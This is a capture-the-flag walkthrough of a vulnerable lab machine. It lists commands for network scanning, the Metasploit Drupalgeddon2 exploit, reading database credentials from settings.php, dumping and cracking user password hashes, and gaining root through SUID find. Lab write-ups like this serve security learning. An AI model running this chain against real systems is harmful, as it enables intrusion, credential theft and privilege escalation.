# Step 1
-     sudo netdiscover
  to find ip address

# Step 2 

-     nmap -A 192.168.1.7(ip Address)

- The NMAP scan indicates that three ports are open: 22 (SSH), 80 (HTTP), and 111 (RPC).
- Discovering that port 80 is running HTTP, we proceed to open the IP address in our web browser.
![1_2Kwm-x_URC1htqpofvbB3g](https://github.com/user-attachments/assets/4abe3213-2297-474e-9f36-7472a6043ed4)
- Gaining access through Metasploit

# Step 3


-     msfconsole
-  you will get msf6
-  And After
- ![1_vYyh1BcTAxysdOKYpbWjYg](https://github.com/user-attachments/assets/88fb3e8a-d276-44f7-a44c-c35519021158)
-      use1 (exploit/unix/webapp/drupal_drupalgeddon2)
- ![1_i0hVEshkcVHx4unvqfV4gg](https://github.com/user-attachments/assets/268ac80a-eb8a-4e81-a412-a280936df712)
-       set RHOSTS 192.168.1.7
  ![1_dQ4C8mnztFsqlIDKfaET_Q](https://github.com/user-attachments/assets/ae64d4e2-16b3-4b48-b374-6c1a027e33a9)
-       run
![1__mNmz52EWe1j-2-RfrAP_A](https://github.com/user-attachments/assets/ac9354d6-8c8c-483f-a5ee-cc670cb34ccd)
- and we got the meterpreter shell
-       shell
- ![1_zGF30kTNo0bayg3SM2ezUQ](https://github.com/user-attachments/assets/5f293e8a-6e73-4412-9beb-ec7a67453dbe)
# And we got our first flag flag1.txt
- Let’s open flag1.txt to get hint.
-     cat flag1.txt
- ![1_A24YvaXAcm-YfNt87uQurA](https://github.com/user-attachments/assets/e13134c4-0d18-4fec-8f09-6f1318b3444e)
-     cd sites
-     ls
- ![1_yF6oD1C36u2Zy1rm2Ceelg](https://github.com/user-attachments/assets/14ca2769-070b-4b1e-bf46-b0b8c318947f) 
-     cd default
-     ls
- ![1_qDVAZZ7rJAEvn5aV5Nx-lQ](https://github.com/user-attachments/assets/8db89e37-c5cb-43f0-a86a-ad5c14c95f31)
-     cat settings.php
- ![1_aft07dyy-H4M9sy1uIisJQ](https://github.com/user-attachments/assets/d48993a7-fba0-42a1-abed-8fa7fbc9f783)
# And we got our Second flag
-     python -c 'import pty; pty.spawn("/bin/bash")'
- ![1_Am6KhzR7UdJ0tRKz13eWXA](https://github.com/user-attachments/assets/6fec0f1b-3cc8-4aae-8d65-ae01043b200b)
-      mysql -u dbuser -p
-  ![1_Y-bhof_z2Q_7qOeCqcbovA](https://github.com/user-attachments/assets/ae70ad77-5473-42c3-b245-2ad040925f40)
- show databases;
![1_9OPR3qbqwl1J3KUSHAtR4A](https://github.com/user-attachments/assets/4521da7a-0aac-4e40-89ad-18e0b6657a67)
- use drupaldb
- ![1_766vFVJHP7mvJQ6w52j4AA](https://github.com/user-attachments/assets/3eb36dec-dcb7-46cb-9b63-6745ff631d0a)
- show tables;
- ![1_DDZGBwGl3y3BYswd2kfzPg](https://github.com/user-attachments/assets/89377014-11d6-4c2e-9fe3-5a90b705adb1)

- find users
- ![1_h9PkyfrUZ2WDWIyp6MIxAg](https://github.com/user-attachments/assets/b0e574b8-d1f5-4ee0-a411-cd85ab698377)
- select *from users;
- ![1_gq4oCfMMXH8emMQUGVeHBA](https://github.com/user-attachments/assets/bde39d5c-64c0-408f-9ac9-953081bd441b)
- After Carcking the hash using hashcat
- The password was [53cr3t].
# And we login and found our Third flag in dashboard.
![1_9mSrghjJhhiEiv4bV_uW7Q](https://github.com/user-attachments/assets/7a7226f1-9938-4b42-81ee-6f1f31fd3ede)
# Then for the fourth flag.
- we have to go in meterpreter again.
-     shell
-     ls
- ![1_Jedcs2UuDaBKNbuIes61yg](https://github.com/user-attachments/assets/737ce6c8-3289-4f2a-b15b-a61bf52fbecd)
-      pwd
-      cd/home
-     ls
![1_FwHkvQRZ2dZiPHhVfIHTQQ](https://github.com/user-attachments/assets/0079177d-fe6f-4e13-9a88-f47017a6df1f)
-      find / -perm -u=s -type f 2>/dev/null
-  ![1_DhGDCGWfAzLS8htV3BmLzg](https://github.com/user-attachments/assets/42735d17-a3ec-4df9-9685-aeb6f08db736)

-        id
-        find . -exec/bin/sh \; -quit
-        id
-        cd/root
-        ls
-        cat thefinalflag.txt
-    ![1_lYDlCvjp5_CGBHVtyuYtvQ](https://github.com/user-attachments/assets/8ac97bae-cc6c-4d5c-8871-482aba7aed41)

